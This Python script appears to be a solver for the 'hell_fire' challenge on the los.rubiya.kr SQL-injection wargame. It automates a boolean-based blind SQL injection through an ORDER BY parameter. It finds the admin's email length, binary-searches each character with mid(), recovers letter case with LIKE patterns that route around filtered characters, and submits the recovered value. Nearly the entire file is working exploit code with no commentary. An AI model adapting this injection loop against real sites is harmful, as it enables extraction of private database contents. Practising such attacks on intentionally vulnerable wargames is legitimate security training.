from constants import *

chall_url = "https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php"

admin_first = "<th>score</th><tr><td>admin</td>"
rubiya_first = "<th>score</th><tr><td>rubiya</td>"
filtered_chars = ["_", "."]

prefix = ""


def find_char(pos):
    min_val = 0
    max_val = 0xFF
    byteLen = 2
    while True:
        test_val = max_val - (max_val - min_val) // 2
        # print(hex(min_val)[2:].zfill(byteLen), hex(test_val)[2:].zfill(byteLen), hex(max_val)[2:].zfill(byteLen))
        res = make_request(chall_url, "?order=" + urllib.parse.quote(
            f"if(id='admin' and mid(email,{pos},1) >= 0x{hex(min_val)[2:].zfill(byteLen)} and mid(email,{pos},1) < 0x{hex(test_val)[2:].zfill(byteLen)},1,3)"))
        if admin_first in res:
            if test_val - min_val == 1:
                print("found char", hex(min_val), chr(min_val))
                return chr(min_val)
            max_val = test_val
        elif rubiya_first in res:
            min_val = test_val
        else:
            print(res)
            assert False, "invalid query"


pw_len = 28

if pw_len is None:
    for i in range(40):
        res = make_request(chall_url, "?order=" + urllib.parse.quote(f"if(id='admin' and length(email)={i},1,3)"))
        if admin_first in res:
            print("Found pw length:", i)
            pw_len = i
            break
        elif rubiya_first in res:
            continue
        else:
            print(res)
            assert False, "invalid query"
    assert pw_len

prefix = "ADMIN_SECURE_EMAIL@EMAI1.COM"

while len(prefix) < pw_len:
    pos = len(prefix) + 1
    new_char = find_char(pos)
    prefix += new_char
    print("new prefix: ", prefix)


def transform_filtered_chars(str):
    res = ""
    for char in str:
        if char in filtered_chars:
            res += "%"
        else:
            res += char
    return res


case_sensitive_prefix = ""
for char in prefix:
    if char in filtered_chars:
        case_sensitive_prefix += char
        continue

    test_prefix = transform_filtered_chars(case_sensitive_prefix + char.lower())
    res = make_request(chall_url, "?order=" + urllib.parse.quote(f"if(id='admin' and email like '{test_prefix}%',1,3)"))
    if admin_first in res:
        case_sensitive_prefix += char.lower()
    elif rubiya_first in res:
        case_sensitive_prefix += char.upper()
    else:
        print(res)
        assert False, "invalid query"
    print("Case sensitive prefix:", case_sensitive_prefix)

res = make_request(chall_url, f"?email={case_sensitive_prefix}")
check_clear(res)
